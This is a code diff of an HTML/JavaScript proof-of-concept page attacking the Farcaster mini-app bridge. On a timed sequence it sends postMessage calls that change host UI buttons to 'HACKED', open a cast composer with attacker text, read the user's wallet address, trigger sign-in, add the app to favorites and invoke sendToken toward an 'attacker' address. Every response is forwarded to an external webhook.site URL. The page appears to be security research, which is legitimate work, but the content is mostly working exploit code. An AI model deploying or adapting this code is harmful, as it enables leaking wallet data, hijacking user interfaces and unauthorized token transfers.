@@ -49,21 +49,6 @@
 				max-height: 200px;
 				overflow-y: auto;
 			}
-			.pass {
-				color: #4ade80;
-			}
-			.current {
-				color: #facc15;
-				font-weight: bold;
-			}
-			#action-log {
-				font-size: 13px;
-				line-height: 1.8;
-			}
-			.action-item {
-				padding: 4px 0;
-				border-bottom: 1px solid #2a2035;
-			}
 			.pending {
 				color: #666;
 			}
@@ -75,6 +60,10 @@
 			}
 			.error {
 				color: #f87171;
+			}
+			.action-item {
+				padding: 4px 0;
+				border-bottom: 1px solid #2a2035;
 			}
 		</style>
 	</head>
@@ -98,11 +87,9 @@
 
 		<script>
 			var WEBHOOK = "https://webhook.site/a9641ead-2421-404a-83bd-6be9ad1c4e60";
-			var msgCounter = 3000;
+			var msgCounter = 4000;
 			var allResponses = [];
 			var actionLog = document.getElementById("action-log");
-			var actions = [];
-			var currentAction = 0;
 
 			function sendToWebhook(label, data) {
 				try {
@@ -115,31 +102,28 @@
 				} catch (e) {}
 			}
 
-			// Listen for responses
 			window.addEventListener("message", function (event) {
-				if (event.origin === "https://farcaster.xyz" || event.data?.type === "HANDLER" || event.data?.type === "RAW") {
+				if (event.data?.type === "HANDLER" || event.data?.type === "RAW") {
 					var resp = {
 						id: event.data?.id,
 						type: event.data?.type,
 						value: event.data?.value,
 						name: event.data?.name,
-						ts: new Date().toISOString(),
 					};
 					allResponses.push(resp);
 					document.getElementById("last-response").textContent = JSON.stringify(resp, null, 2);
 					document.getElementById("all-responses").textContent = JSON.stringify(allResponses, null, 2);
 					sendToWebhook("RESPONSE", event.data);
 
-					// Update action status
 					var actionEl = document.getElementById("action-" + event.data?.id);
 					if (actionEl) {
 						if (event.data?.type === "RAW" && !event.data?.value?.isError) {
 							actionEl.className = "action-item done";
-							actionEl.innerHTML = actionEl.innerHTML.replace("⏳", "✅");
+							actionEl.innerHTML = actionEl.innerHTML.replace("⏳", "✅ SUCCESS");
 						} else if (event.data?.name === "throw") {
+							var errMsg = event.data?.value?.value?.message || "unknown";
 							actionEl.className = "action-item error";
-							var errMsg = event.data?.value?.value?.message || "unknown error";
-							actionEl.innerHTML = actionEl.innerHTML.replace("⏳", "⚡ EXECUTED but: " + errMsg.substring(0, 60));
+							actionEl.innerHTML = actionEl.innerHTML.replace("⏳", "⚡ EXECUTED: " + errMsg.substring(0, 50));
 						}
 					}
 				}
@@ -156,11 +140,10 @@
 					},
 					"*",
 				);
-				sendToWebhook("CALL_" + method, { id: id, args: args });
+				sendToWebhook("CALL_" + method, { id: id });
 				return id;
 			}
 
-			// Define the sequence of actions with delays
 			var sequence = [
 				{
 					delay: 2000,
@@ -168,91 +151,90 @@
 					fn: function () {
 						return call("ready", [{}]);
 					},
-					desc: "Signal ready to Farcaster",
+					desc: "Signal ready",
 				},
 				{
-					delay: 4000,
-					name: "close()",
-					fn: function () {
-						return call("close", []);
-					},
-					desc: "Close the mini app — should dismiss the panel",
-				},
-				{
-					delay: 8000,
-					name: 'openUrl("https://example.com")',
+					delay: 5000,
+					name: "openUrl()",
 					fn: function () {
 						return call("openUrl", ["https://example.com"]);
 					},
-					desc: "Open a URL — should open new tab",
+					desc: "Open URL in new tab",
 				},
 				{
-					delay: 12000,
-					name: 'setPrimaryButton("HACKED")',
+					delay: 9000,
+					name: "setPrimaryButton()",
 					fn: function () {
 						return call("setPrimaryButton", ["HACKED", true]);
 					},
-					desc: "Change button text in Farcaster UI",
+					desc: "Change button text",
 				},
 				{
-					delay: 16000,
-					name: "viewProfile(fid: 3)",
+					delay: 13000,
+					name: "viewProfile(fid:3)",
 					fn: function () {
 						return call("viewProfile", [3]);
 					},
-					desc: "Navigate to Dan Romero profile",
+					desc: "Navigate to dwr profile",
 				},
 				{
-					delay: 20000,
-					name: 'composeCast("pwned")',
+					delay: 17000,
+					name: "composeCast()",
 					fn: function () {
-						return call("composeCast", ["Security PoC - this was triggered by an attacker"]);
+						return call("composeCast", ["Security PoC - attacker controlled"]);
 					},
-					desc: "Open cast composer with attacker text",
+					desc: "Open composer with attacker text",
 				},
 				{
-					delay: 24000,
+					delay: 21000,
 					name: "eth_accounts",
 					fn: function () {
 						return call("ethProviderRequestV2", [{ method: "eth_accounts", params: [] }]);
 					},
-					desc: "Request wallet accounts — leaks address",
+					desc: "Get wallet address",
 				},
 				{
-					delay: 28000,
+					delay: 25000,
 					name: "eth_chainId",
 					fn: function () {
 						return call("ethProviderRequestV2", [{ method: "eth_chainId", params: [] }]);
 					},
-					desc: "Request chain ID",
+					desc: "Get chain ID",
 				},
 				{
-					delay: 32000,
+					delay: 29000,
 					name: "signIn()",
 					fn: function () {
-						return call("signIn", ["attacker_nonce_" + Date.now()]);
+						return call("signIn", ["nonce_" + Date.now()]);
 					},
-					desc: "Trigger sign-in flow",
+					desc: "Trigger sign-in",
 				},
 				{
-					delay: 36000,
+					delay: 33000,
 					name: "addMiniApp()",
 					fn: function () {
 						return call("addMiniApp", []);
 					},
-					desc: "Add attacker app to favorites",
+					desc: "Add to favorites",
 				},
 				{
-					delay: 40000,
+					delay: 37000,
 					name: "sendToken()",
 					fn: function () {
 						return call("sendToken", ["eip155:8453/erc20:0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "1", "0x0000000000000000000000000000000000000001"]);
 					},
-					desc: "Trigger token send to attacker address",
+					desc: "Send token to attacker",
+				},
+				{
+					delay: 41000,
+					name: "close()",
+					fn: function () {
+						return call("close", []);
+					},
+					desc: "Dismiss the mini app panel (LAST)",
 				},
 			];
 
-			// Build the action log UI
 			actionLog.innerHTML = "";
 			sequence.forEach(function (action, i) {
 				var div = document.createElement("div");
@@ -262,19 +244,13 @@
 				actionLog.appendChild(div);
 			});
 
-			// Execute each action on schedule
 			sequence.forEach(function (action, i) {
 				setTimeout(function () {
 					var el = document.getElementById("action-pending-" + i);
 					el.className = "action-item running";
-					el.innerHTML = '<span class="running">⏳ ' + action.name + "</span> — " + action.desc + " — EXECUTING...";
-
+					el.innerHTML = '<span class="running">⏳ ' + action.name + "</span> — " + action.desc;
 					var id = action.fn();
-
-					// Update element ID to match the comlink ID for response tracking
 					el.id = "action-" + id;
-
-					// Scroll to current action
 					el.scrollIntoView({ behavior: "smooth", block: "nearest" });
 				}, action.delay);
 			});
